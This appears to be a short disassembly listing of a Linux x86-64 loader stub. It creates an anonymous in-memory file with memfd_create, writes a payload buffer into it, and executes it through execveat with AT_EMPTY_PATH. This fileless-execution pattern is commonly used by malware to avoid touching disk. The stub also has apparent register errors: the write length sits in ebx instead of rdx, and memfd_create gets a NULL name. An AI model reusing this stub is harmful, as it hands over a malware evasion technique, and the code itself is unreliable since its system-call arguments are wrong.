[bits 64]

mov     eax, 0x13F
mov     esi, 7
mov     edi, 0
syscall                 ; LINUX - sys_memfd_create
mov     rdx, rax
mov     rdi, rdx
mov     eax, 1
mov     esi, 0x200db8
mov     ebx, 0x2070
syscall                 ; LINUX - sys_write
mov     eax, 0x142
mov     rdi, rdx
mov     esi, 0
mov     edx, 0
mov     r10d, 0
mov     r8d, 0x1000
syscall
